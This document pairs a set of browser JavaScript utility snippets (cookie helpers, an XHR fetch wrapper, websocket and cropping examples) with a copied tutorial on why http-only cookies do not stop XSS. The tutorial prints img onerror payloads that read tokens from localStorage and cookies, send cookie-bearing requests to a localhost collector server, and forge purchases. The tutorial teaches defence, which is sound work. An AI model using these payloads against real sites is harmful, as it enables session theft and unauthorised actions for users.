##
##
##  https://academind.com/tutorials/localstorage-vs-cookies-xss
#
#
##
##



client_cookie.js

```
const getCookie = cname => {
	var name = cname + '='
	var decodedCookie = decodeURIComponent(document.cookie)
	var ca = decodedCookie.split(';')
	for(var i = 0; i <ca.length; i++) {
		var c = ca[i]
		while (c.charAt(0) == ' ')
			c = c.substring(1)
		if (c.indexOf(name) == 0)
			return c.substring(name.length, c.length)
	}
	return ''
}

function setCookie(name,value,days) {
	var expires = ''
	if (days) {
	var date = new Date()
		date.setTime(date.getTime() + (days*24*60*60*1000))
		expires = "; expires=" + date.toUTCString()
	}
	document.cookie = name + "=" + (value || "")  + expires + "; path=/"
}
```

client_fetch.js
```
/**
 * Copyright (c) 2017-2019, Neap Pty Ltd.
 * All rights reserved.
 * 
 * This source code is licensed under the BSD-style license found in the
 * LICENSE file in the root directory of this source tree.
*/
	
function _getResponseHeaders(xhttp) {
	// Get the raw header string
	var headers = xhttp.getAllResponseHeaders() || ''

	// Convert the header string into an array
	// of individual headers
	var arr = headers.trim().split(/[\r\n]+/)

	// Create a map of header names to values
	return arr.reduce(function(acc,line) {
		var parts = line.split(': ')
		var header = parts.shift()
		var value = parts.join(': ')
		acc[header] = value
		return acc
	}, {})
}

function _parseResponse(xhttp) {
	var content
	try {
		content = xhttp.responseText
	} catch(err) {
		function f() { return xhttp.response }
		content = f(err)
	}
	var status = xhttp.status
	var headers = _getResponseHeaders(xhttp) || {}
	var contentType = headers['content-type'] || headers['Content-Type']
	var isJSON = contentType && contentType.indexOf('json') >= 0

	if (isJSON) {
		try {
			var c = JSON.parse(content)
			return { status, data:c, headers }
		} catch(e) {
			function f() {
				return { 
					status:500, 
					data:{ 
						error: {
							message: 'Fairplay SDK Error. Server responded successfully, but the SDK failed to parse JSON response', 
							data: content
						}
					}, 
					headers
				}
			} 
			return f(e)
		}
	} else {
		return { status, data:content, headers }
	}
}

function _setRequestHeaders(xhttp, headers) {
	if (!headers || !xhttp)
		return
	if (typeof(headers) != 'object')
		throw new Error('Wrong argument exception. \'headers\' must be an object.')

	Object.keys(headers).forEach(function(key) {
		var value = headers[key]
		// Do not add 'multipart/form-data' content type if it is missing the boundary info. 
		// By not specifying it and POSTing a 'FormData' object, the browser automatically set the Content-Type as follow:
		// 	'multipart/form-data; boundary=----WebKitFormBoundaryj7VA9uHwoGFvcBQx'
		const skip = (key == 'Content-Type' || key == 'content-type') && value && value.indexOf('multipart/form-data') >= 0 && value.indexOf('boundary') < 0
		if (!skip)
			xhttp.setRequestHeader(key, value)
	})
}

function _getBody(headers, body) {
	var bodyType = typeof(body)
	var nativeBody = !body || bodyType == 'string' || (body instanceof Blob) || (body instanceof FormData) || (body instanceof URLSearchParams)
	if (nativeBody)
		return body

	var contentType = (!headers || typeof(headers) != 'object' 
		? ''
		: headers['Content-Type'] || headers['content-type'] || '').toLowerCase().trim()

	var isUrlEncoded = contentType == 'application/x-www-form-urlencoded'
	var isFormEncoded = contentType == 'multipart/form-data'
	if ((isUrlEncoded || isFormEncoded) && bodyType == 'object') {
		var params = isUrlEncoded ? new URLSearchParams() : new FormData()
		for (var key in body) {
			var value = body[key]
			if (value !== null && value !== undefined) {
				if (isFormEncoded && typeof(value) == 'object' && !(value instanceof Blob))
					params.append(key, new Blob([JSON.stringify(value)], { type:'application/json' }))	
				else
					params.append(key, value)
			}
		}
		return params
	} else 
		return JSON.stringify(body)
}

/**
 * Sends an AJAX request. 
 * Examples:
 *
 * // Submit a Form with a file
 * const { status, data } = await _fetchMethod({
 *		uri: 'http://localhost:4220/entry/32',
 *		method: 'POST',
 *		headers: {
 *				'Content-Type': 'multipart/form-data'
 *			},
 *		body: {
 *			hello: 'World',
 *			myFile: document.querySelector('input[type="file"]').files[0]
 *		}
 *	})
 * 
 * // POST URL encoded data
 * const { status, data } = await _fetchMethod({
 *		uri: 'http://localhost:4220/entry/32',
 *		method: 'POST',
 *		headers: {
 *				'Content-Type': 'application/x-www-form-urlencoded'
 *			},
 *		body: {
 *			hello: 'World'
 *		}
 *	})
 *	
 * @param {String}  uri 			
 * @param {String}  method 			HTTP methods. Valid values are: 'GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'HEAD' and 'PATCH'.			
 * @param {Object}  headers 		HTTP request headers. 			
 * @param {Object}  body 			Payload.
 * @param {String}  responseType	e.g., 'text', 'blob' (use 'blob' for images)
 * 
 * @yield {Number}	output.status	HTTP response status code 
 * @yield {Object}	output.data 	If the response's content type if application/json, then 'data' is a JSON object,
 *        							otherwise, it is a string. 
 * @yield {Object}	output.headers 	HTTP response headers
 */
function _fetchMethod(input) { 
	var uri = input.uri
	var method = input.method
	var headers = input.headers || {}
	var body = input.body
	var responseType = input.responseType
	return new Promise(function (resolve,reject) {
		try {
			if (!uri)
				throw new Error('Missing required argument \'uri\'.')
			if (!method)
				throw new Error('Missing required argument \'method\'.')

			var xhttp = new XMLHttpRequest()
			// 1. Define the handler that processes the response.
			xhttp.onreadystatechange = function() {
				if (xhttp.readyState == XMLHttpRequest.DONE) {
					var res = _parseResponse(xhttp)
					resolve(res)
				}
			}
			if (responseType)
				xhttp.responseType = responseType
			xhttp.open(method, uri, true) 
			_setRequestHeaders(xhttp, headers)

			var payload = _getBody(headers, body)

			// 3. Execute the HTTP request.
			if (payload)
				xhttp.send(payload)
			else
				xhttp.send()
		} catch (e) {
			reject(e)
		}
	})
}

function graphQLQuery(input) {
	var uri = input.uri
	var headers = input.headers
	var query = input.query
	if (!uri)
		throw new Error('Missing required \'uri\' argument.')
	if (!query)
		throw new Error('Missing required \'query\' argument.')
	if (typeof(query) != 'string')
		throw new Error('Wrong argument exception. \'query\' must be a string.')

	var api_url = uri + '?query=' + encodeURIComponent(query)
	return _fetchMethod({ uri:api_url, method:'GET', headers })
}

function graphQLMutation(input) {
	var uri = input.uri
	var headers = input.headers
	var query = input.query
	if (!uri)
		throw new Error('Missing required \'uri\' argument.')
	if (!query)
		throw new Error('Missing required \'query\' argument.')
	if (typeof(query) != 'string')
		throw new Error('Wrong argument exception. \'query\' must be a string.')
	var api_url = uri + '?query=mutation' + encodeURIComponent(query)
	return _fetchMethod({ uri:api_url, method:'POST', headers })
}


var fetch = {
	'get': function(input) {
		return  _fetchMethod({ uri: input.uri, method:'GET', headers:input.headers, body:input.body, responseType:input.responseType })
	},
	post: function(input) {
		return  _fetchMethod({ uri: input.uri, method:'POST', headers:input.headers, body:input.body, responseType:input.responseType })
	},
	put: function(input) {
		return  _fetchMethod({ uri: input.uri, method:'PUT', headers:input.headers, body:input.body, responseType:input.responseType })
	},
	delete: function(input) {
		return  _fetchMethod({ uri: input.uri, method:'DELETE', headers:input.headers, body:input.body, responseType:input.responseType })
	},
	options: function(input) {
		return  _fetchMethod({ uri: input.uri, method:'OPTIONS', headers:input.headers, body:input.body, responseType:input.responseType })
	},
	head: function(input) {
		return  _fetchMethod({ uri: input.uri, method:'HEAD', headers:input.headers, body:input.body, responseType:input.responseType })
	},
	patch: function(input) {
		return  _fetchMethod({ uri: input.uri, method:'PATCH', headers:input.headers, body:input.body, responseType:input.responseType })
	},
	graphql: {
		query: graphQLQuery, // fetch.graphql.query({ uri, headers:{}, query: `{ users(where:{ id:1 }){ id name } }` })
		mutation: graphQLMutation // fetch.graphql.mutate({ uri, headers:{}, query: `{ userInsert(input:{ name:"Nic" }){ id name } }` })
	}
}

export {
	fetch
}
client_url.js
/**
 * Extracts a specific parameter from the query string. That parameter is also decoded.
 * 
 * @param  {String} field Parameter name
 * @param  {String} url   Optional, default is 'window.location.href'
 * @return {String}       Decoded parameter's value
 */
function getQueryString (field, url) {
	var href = url ? url : window.location.href
	var reg = new RegExp( '[?&]' + field + '=([^&#]*)', 'i' )
	var string = reg.exec(href)
	return string ? decodeURIComponent(string[1]||'') : null
}

const url = {
	getQueryString
}

export {
	url
}
```

client_websocket.js

```
// This example works for connection to any websocket server, however, the comments below 
// are specific to AWS API Gateway.

let socket = new WebSocket("wss://123467654.execute-api.ap-southeast-2.amazonaws.com/dev")

socket.onopen = function(e) {
  alert("[open] Connection established")
  alert("Sending to server")
  // The following request will fire back 'socket.onmessage' below. The value 
  // of the 'event.data' will be similar to '{"message": "Forbidden", "connectionId":"DBNjmfOmSwMCJiA=", "requestId":"DBNlXFDjSwMF3FA="}'
  socket.send("My name is John") 
}

/**
 * Callback function fired when the server sends a message.
 * 
 * @param  {String} event.data	Server's message
 * @return {Void}
 */
socket.onmessage = function(event) {
  alert(`[message] Data received from server: ${event.data}`)
}

socket.onclose = function(event) {
  if (event.wasClean) {
    alert(`[close] Connection closed cleanly, code=${event.code} reason=${event.reason}`)
  } else {
    // e.g. server process killed or network down
    // event.code is usually 1006 in this case
    alert('[close] Connection died')
  }
}

socket.onerror = function(error) {
  alert(`[error] ${error.message}`)
}
```

clipboard.js
```
// This code below assumes that the value to copy to clipboard is inside a 'hidden' input.
// It could also be in a normal 'text' input, in which case you could ignore the setAttribute('type', 'text')
// line.
// WARNING: The '#clipboard-container' cannot have its CSS display property set to 'none'. This would break this code.
var copyToClipboard = () => {
	var copyText = document.querySelector('#clipboard-container')
	copyText.setAttribute('type', 'text')
	copyText.select()
	document.execCommand('copy')
	copyText.setAttribute('type', 'hidden')
}
```

commander.js

```
#!/usr/bin/env node

// NOTE: The official inquirer documentation is really good. To know more about the different question types,
// please refer to https://www.npmjs.com/package/inquirer#prompt-types

const program = require('commander')
const inquirer = require('inquirer')
require('colors')
const { version } = require('./package.json')

program.version(version) // This is required is you wish to support the --version option.

// 1. Creates your first command. This example shows an 'order' command with a required argument
// called 'product' and an optional argument called 'option'.
program
	.command('order <product> [option]')
	.alias('o') // Optional alias
	.description('Order food or coffee') // Optional description
	.action(async (product, option) => {
		let answers = {}
		// Creates multiple choices
		if (product == 'coffee')
			answers = await inquirer.prompt([
				// NOTE:
				//	- To use the 'default' option with the 'list' type, you need to provide 
				//	the index of the default value. 
				//	- To use different display name, replace the strings in the 'choices' with:
				//	{ name: 'Display name', value:'Real value' }
				//
				{ type: 'list', name: 'coffeType', message: 'What coffee do you want?', choices: ['Capucino', 'Soi picolo'], default:1 },
				{ type: 'list', name: 'size', message: 'Choose a size', choices: ['large', 'regular'] },
				{ type: 'confirm', name: 'sugar', message: 'Do you want sugar?', default: false }
			])
		else if (product == 'food')
			answers = await inquirer.prompt([
				{ type: 'list', name: 'foodType', message: 'What food do you want?', choices: ['Sandwich', 'Bagel'] },
				{ type: 'list', name: 'size', message: 'Choose a size', choices: ['large', 'regular'] }
			])
		else {
			console.log(`Sorry, but we don't sell ${product}.`)
			process.exit()
		}			

		// Creates open question
		const { name } = await inquirer.prompt([{ type:'input', name:'name', message:'What is your name?' }])

		console.log({ ...answers, name })
	})


// 2. Deals with cases where no command is passed.
const helpGuideOn = false
if (process.argv.length == 2) {
	// Shows the help guide
	if (helpGuideOn)
		program.helpInformation()
	else // Default to ordering coffeee
		process.argv.push('order', 'coffee')

}

// 3. Starts the commander program
program.parse(process.argv) 
core.js
function newId() {
  return Math.random().toString(36).substr(2, 9)
}

function validateEmail(email) {
  return /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/i.test(email)

}

export default {
  identity: { new: newId },
  validate: {
    email: validateEmail
  }
}
cropping_image.md
<input type="file" id="upload-file" name="pic" accept="image/*" onchange="loadImage">
<img id="cropper-container" style="max-width:100%;"/>
import Cropper from '../../modules/cropper/index.js'

let cropper

const loadImage = input => {
	const files = ((input || {}).target || {}).files || []
	if (files[0]) {
		const reader = new FileReader()
		reader.onloadend = () => {
			// This is a hack to allow to reload the same image.
			document.getElementById('upload-file').value = null
			const blob = reader.result
			if (blob) {
				const image = document.getElementById('cropper-container')
				if (cropper)
					cropper.replace(blob)
				else
					cropper = new Cropper(image, {
						aspectRatio: 1,
						minContainerWidth: 300, // Canvas width
						minContainerHeight: 300, // Canvas height
						autoCropArea: 1 // Start the crop box to fill 100% of the canvas.
					})
			}
			_blobBase64 = reader.result
		}
		reader.readAsDataURL(files[0])
	}
}

const getCroppedImage = () => cropper.getCroppedCanvas().toDataURL()

// Converts a base64 data image to a blob
const dataURItoBlob = dataURI => {
	var binary = atob(dataURI.split(',')[1])
	var array = []
	for(var i = 0; i < binary.length; i++)
		array.push(binary.charCodeAt(i))
	
	return new Blob([new Uint8Array(array)], {type: 'image/png'})
}

const uploadImageToServer = () => {
	const dataURI = getCroppedImage()
	const blob = dataURItoBlob(dataURI)
	const formData = new FormData()
	formData.append('file', blob)

	$.ajax({
		url: 'https://yourserver.com',
		type: 'POST',
		enctype: 'multipart/form-data',
		data: formData,
		processData: false,
		contentType: false,
		success: function(data,_,xhr) {
			next({ status: (xhr || {}).status, data })
		},
		error: function(xhr,_,error) {
			fail({ status: (xhr || {}).status, data:{ error: { message: (xhr || {}).responseText || '', error } } })
		}
	})
}
   ``` 


##
##

A Common Misconception

If you browse the internet, you find quite a lot of developers spreading the information that localStorage would be insecure and you shouldn't use it to store authentication tokens. Instead, you should use http-only cookies that hold those tokens.

Side-note: If you're not sure what I mean with "authentication tokens", you might want to check out my Node.js - The Complete Guide course - I cover the two most common authentication mechanisms (sessions & tokens) in great detail there!

In this article, I'll explain in detail why http-only cookies are not more secure than localStorage and what that means for you and your app.
Related Premium Courses

    JavaScript - The Complete Guide
    JavaScript - The Complete Guide

    Learn all about JavaScript - including security - from the ground up with this bestselling, >50 hour JavaScript course.
    NodeJS - The Complete Guide
    NodeJS - The Complete Guide

    Learn how to build any kind of Node backend (MVC, REST API, GraphQL API) from the ground up with this in-depth Node course.

#Understanding localStorage

localStorage is a browser API that allows you to access a special browser storage which can hold simple key-value pairs.

localStorage.setItem('token', 'abc') // store 'abc' with key 'token'
const token = localStorage.getItem('token') // retrieve item with key 'token'

localStorage is a great API for storing simple data because it's easy to use and whilst it's not suitable for complex data (e.g. files or complex objects), it's great for basic data like authentication tokens, which are just strings.

A typical authentication flow in a modern single-page-application could then just look like this:

async function authenticate(email, password) {
  const response = await fetch('https://my-backend.com/login', {
    method: 'POST',
    body: JSON.stringify({ email, password }),
  })

  const data = await response.json()

  localStorage.setItem('token', data.token) // assuming the response data yields the token
}

This token is then required to attach it to outgoing requests that target endpoints (URLs) which are only open to authenticated users. The code typically would look something like this:

async function getUserInfo() {
  const token = localStorage.getItem('token')
  const response = await fetch('https://my-backend.com/user-data', {
    headers: {
      Authorization: 'Bearer ' + token,
    },
  })
  // handle response + response data thereafter
}

We attach the token on the Authorization header and send it to the server, where it can be verified and then grants the user access to protected data.

Looks good and is pretty straightforward, right?

Indeed, it is a great approach and - contrary to the misconception mentioned in the beginning of the article - it is perfectly fine to use localStorage.

But you can indeed also run into problems if your page is vulnerable to Cross-Site-Scripting (XSS) attacks.
#How to launch XSS Attacks

Important: I got a deep-dive article on XSS attacks which you might want to check out in addition to this section. For the rest of this article, I assume that you know what a XSS attack is.

In the code and video that belongs to this article, you see, in detail, how you can launch an XSS attack on a vulnerable page.

Have a look at this short code snippet:

const contentWithUserInput = `
  <img src="${userPickedImageUrl}">
  <p>${someUserInput}</p>
`

outputElement.innerHTML = contentWithUserInput

What's wrong with this code?

We directly set the innerHTML of some outputElement (this can simply be a reference to some DOM element on our page).

If someUserInput contains JavaScript code, this could cause problems:

// highlight-next-line
const someUserInput = '<script>alert("Hacked!")</script>'

const contentWithUserInput = `
  <img src="${userPickedImageUrl}">
  <p>${someUserInput}</p>
`

outputElement.innerHTML = contentWithUserInput

To be honest, most browser should catch this and indeed you should not be getting the "Hacked" alert.

But this next code snippet WILL cause problems:

// highlight-next-line
const userPickedImageUrl =
  'https://some-invalid-url.com/no-image!jpg" onerror="alert("Hacked")"'

const contentWithUserInput = `
  <img src="${userPickedImageUrl}">
  <p>${someUserInput}</p>
`

outputElement.innerHTML = contentWithUserInput

What's the problem with that?

We in the end just build a string that we store in contentWithUserInput. And with the above code, this string would look like this (with all values being inserted):

<img
  src="https://some-invalid-url.com/no-image!jpg"
  onerror="alert('Hacked')"
/>
<p>Some message...</p>

With the injected code, we deliberately try to load an image that does not exist which then in turn will cause the onerror code to execute.

onerror is a valid HTML attribute for the <img> element and hence everything will run just fine.

This is how an XSS attack could be launched if user input (in this case received in userPickedImageUrl) is not escaped.
#Stealing Data from localStorage with XSS Attacks

With the XSS vulnerability described above, it's quite easy to steal the token and/ or any other data that requies that token.

// highlight-next-line
const userPickedImageUrl =
  'https://some-invalid-url.com/no-image!jpg" onerror="const token = localStorage.getItem("token")'

const contentWithUserInput = `
  <img src="${userPickedImageUrl}">
`

outputElement.innerHTML = contentWithUserInput

In this above snippet we retrieve the token in our injected code and we can then send it to our own server (i.e. the server of the attacker) or do whatever we want to do with it.

By the way, in case you're thinking that we only steal our own token here: Such user-generated data is typically stored in databases and then might be rendered for all kinds of users all over the world (e.g. comments below a video).

If you store such unsanitized input, this injected XSS JavaScript code could run on thousands of machines for thousands of users. All those tokens (and therefore the data of those users) would be at risk.
#Switching from localStorage to Cookies

You often read that cookies would be better than localStorage when it comes to storing authentication tokens or similar data - simply because cookies are not vulnerable to XSS attacks.

This is not correct!

We can launch the same attack as above if we're using cookies.

Here's how we might fetch a token + store it with help of cookies:

async function authenticate(email, password) {
  const response = await fetch('https://my-backend.com/login', {
    method: 'POST',
    body: JSON.stringify({ email, password }),
  })

  const data = await response.json()

  document.cookie = 'token=' + data.token
}

This stores the token in a cookie named token.

We can retrieve it like this when we need it (e.g. for outgoing requests):

async function getUserInfo() {
  // highlight-start
  const token = document.cookie
    .split('; ')
    .find((c) => c.startsWith('token'))
    .split('=')[1]
  // highlight-end
  const response = await fetch('https://my-backend.com/user-data', {
    headers: {
      Authorization: 'Bearer ' + token,
    },
  })
  // handle response + response data thereafter
}

And here's the code how we can still steal the token with a XSS attack:

// highlight-start
const userPickedImageUrl =
  'https://some-invalid-url.com/no-image!jpg" onerror="const token = document.cookie.split("; ").find(c => c.startsWith("token")).split("=")[1]'
// highlight-end

const contentWithUserInput = `
  <img src="${userPickedImageUrl}">
`

outputElement.innerHTML = contentWithUserInput

This can be a bit hard to read but ultimately, we're running the same code we regularly use to get the token. Just with the intention of stealing it.

And that makes sense: If we can get the token stored in cookies with the "good JavaScript code", we can also do it with the "bad code".
#Using http-only Cookies

Yes, yes - I know what some of you are thinking now: "Max, you are stupid, you should find a new job". Okay, maybe (hopefully!) you're a little less harsh ;-)

The cookie I used was the wrong kind of cookie.

We need a http-only cookie!

Such cookies can't be set or read via client-side JavaScript. We can only set http-only cookies on the server-side.

For example, with Node and Express, the server-side code could look like this:

app.post('/authenticate-cookie', (req, res) => {
  res.cookie('token', 'abc', { httpOnly: true })
  res.json({ message: 'Token cookie set!' })
})

This sets the token on a http-only cookie which is sent back to the client.

The browser will be able to read + use the cookie but our browser-side JavaScript code won't.

Hence, we don't even try to store or use the token locally anymore.

The client-side authentication code looks like this:

async function authenticate(email, password) {
  const response = await fetch('https://my-backend.com/authenticate-cookie', {
    method: 'POST',
    body: JSON.stringify({ email, password }),
  })
}

This is enough because the token is part of the cookie which is included in the response.

Hence, whenever we need to send a request to a protected resource, the request looks just like this:

async function getUserInfo() {
  const response = await fetch('https://my-backend.com/user-data')
  // handle response + response data thereafter
}

Why does this work?

Because http-only cookies are automatically attached to outgoing requests - the browser takes care about that.

At least, they're automatically attached, if the request target domain is the same domain as is serving the frontend. If it's a different domain - i.e. if you have a cross-origin request (e.g. frontend is served on my-page.com, backend on my-backend.com), you need to adjust the client-side code a bit.

async function getUserInfo() {
  const response = await fetch('https://my-backend.com/user-data', {
    // highlight-next-line
    credentials: 'include',
  })
  // handle response + response data thereafter
}

credentials is an option you can set on fetch() to attach all cookies to the outgoing request. The default setting for credentials is same-origin, for cross-origin requests, you need include as a value.

The backend server needs to be prepared appropriately - it needs to set the right CORS headers on responses sent back.

For example, on Node + Express:

app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', 'https://my-page.com/')
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST')
  res.setHeader('Access-Control-Allow-Credentials', true)
  next()
})

These headers grant my-page.com the "right" to send GET and POST requests with credentials to the backend server.

I cover "CORS" and related concepts in great detail in my Node.js - The Complete Guide course. You can also learn more about it in this article.

With that setup, everything works and we're using http-only cookies.

And now let's explore why this is not a single bit better than localStorage
#http-only Cookies and XSS

We can't read or write http-only cookies with client-side JavaScript code. Hence we got to be secured against XSS, right?

Well, what about this code?

// highlight-start
const userPickedImageUrl =
  'https://some-invalid-url.com/no-image!jpg" onerror="fetch("https://localhost:8000/", { credentials: "include" })'
// highlight-end

const contentWithUserInput = `
  <img src="${userPickedImageUrl}">
`

outputElement.innerHTML = contentWithUserInput

This code will send a request to localhost:8000 via the XSS-injected code.

And because of credentials: "include", all cookies (yes, also the http-only cookies) will be attached.

All we need is a backend server that could look like this:

const express = require('express')
const app = express()

app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', 'https://localhost:3000')
  res.setHeader('Access-Control-Allow-Methods', 'GET')
  res.setHeader('Access-Control-Allow-Credentials', true)
  next()
})

app.get('/', (req, res) => {
  token = req.headers.cookie
    .split('; ')
    .find((c) => c.startsWith('token'))
    .split('=')[1]
  res.json({ message: 'Got ya!' })
})
app.listen(8000)

This very simple server sets the right CORS headers, exposes a GET route to / and reads the token from the incoming cookies.

And that's it! Here you go, your http-only cookie is pretty worthless.

Of course you could argue that it's a bit harder to retrieve than localStorage tokens but ultimately it's pretty simple code that can be used to get the token. And you probably shouldn't rely on potential attackers not knowing this pattern.
#What about SameSite

You might read this article and think:

    Well, we got the SameSite cookie attribute. That should help.

Just to clarify - this is how the SameSite attribute could be added:

SameSite=Strict

SameSite takes three possible values:

    None (was the default): Cookies are attached to requests to any site
    Lax (is the default in most browsers): Cookies are allowed to be sent with top-level navigations and will be sent along with GET request initiated by third party website.
    Strict: Cookies are only sent with requests that target the same site

Sounds like a solution, right?

Well, first of all it is important to understand that the SameSite attribute is not supported in internet explorer! And even in 2020+, you might not be able to ignore all those users.

In addition, the Lax default is only set in some browser but for example it's not the default in Safari - there, None is the default.

You can look up the entire browser support table for more information.

But of course, you could block users using Internet Explorer - whether that really is an option, depends on your site though - you still have around 6% of users using IE in 2020.

Nonetheless, you would not be 100% save. Yes, sending the cookie to another domain would not work.

But what about attacks on the same site?

If I have access to your page (via XSS), I can still use that to do things on your site on behalf of your users - for example, I could initiate some purchase or do other bad things like that.

Keep in mind that stealing the auth token might not be the main priority of an attacker. After all, it's about doing things with the logged in user - and for that, I don't necessarily need your token. I can just do stuff for you (via injected JavaScript) whilst you're on the page.

So whilst you would avoid that the cookie/ token can get stolen, you would not protect your users.
#The Problem Only Exists On Localhost

But here's one important note: This scenario only occurs when working with localhost, since localhost:3000 and localhost:8000 are the same domain technically.

If you had different domains - which in reality would be the case, this attack pattern is not possible. So that's a win!

BUT: That ultimately won't save you.

Yes, the token/ cookie can't be sent to a different domain.

But the attacker actually will not really need it to be honest.

As written above already, if I got access to your page via XSS, I don't care about the actual token. I can simply start shopping (or whatever logged in users can do on the site) on your behalf.

// highlight-start
const userPickedImageUrl =
  'https://some-invalid-url.com/no-image!jpg" onerror="fetch("https://localhost:3000/buy-product?prodid=abc", { credentials: "include", method: "POST" })'
// highlight-end

const contentWithUserInput = `
  <img src="${userPickedImageUrl}">
`

outputElement.innerHTML = contentWithUserInput

Since the user is logged in and has a valid token stored in the cookie, that cookie will be added to the request since it's on the same site.

And that's a problem - nothing you can do. Even without "stealing" the auth token, your open to attacks and attackers can do stuff on behalf of your logged in users.
#The Actual Solution

So if all storage mechanisms are insecure - which one should you use then?

This is entirely up to you!

I personally really like localStorage because of its ease-of-use.

The key thing is that you protect against XSS - then you won't have a problem, no matter which approach you're using.

Your page must not be vulnerable to XSS.

Yes, that's a trivial and even a bit of a stupid statement but it is the truth.

If your page is vulnerable to XSS, you'll have a problem. And http-only cookies are not going to save you.

Learn all about XSS and how to protect against it in my XSS article and in my JavaScript - The Complete Guide course!
